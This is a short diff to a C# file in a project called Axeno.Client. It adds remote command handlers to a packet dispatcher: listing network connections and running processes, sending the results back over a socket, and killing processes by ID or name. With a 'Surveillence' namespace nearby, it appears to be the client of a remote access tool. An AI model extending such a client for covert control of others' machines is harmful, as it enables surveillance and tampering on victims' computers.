@@ -3,6 +3,7 @@ using Axeno.Client.Networking.Functions;
 using Axeno.Client.Networking.Functions.General;
 using Axeno.Client.Networking.Functions.Networking;
 using Axeno.Client.Networking.Functions.Surveillence;
+using Axeno.Client.Networking.Functions.System;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -64,6 +65,28 @@ namespace Axeno.Client.Networking
                     case "SendFile":
                         {
                             ReceiveFile.HandlePacket(msgpck);
+                            break;
+                        }
+                    case "GetNetConnections":
+                        {
+                            NetworkConnections.Handle(msgpck); 
+                            break;
+                        }
+                    case "RetrieveProcesses":
+                        {
+                            ClientSocket.Send(ProcessManager.RetrieveProcesses());
+                            break;
+                        }
+                    case "KillProcess":
+                        {
+                            string procid = msgpck.ForcePathObject("ID").AsString;
+                            ProcessManager.KillProcess(Convert.ToInt32(procid));
+                            break;
+                        }
+                    case "KillProcessTree":
+                        {
+                            string procname = msgpck.ForcePathObject("Name").AsString;
+                            ProcessManager.KillProcessTree(procname);
                             break;
                         }
                 }
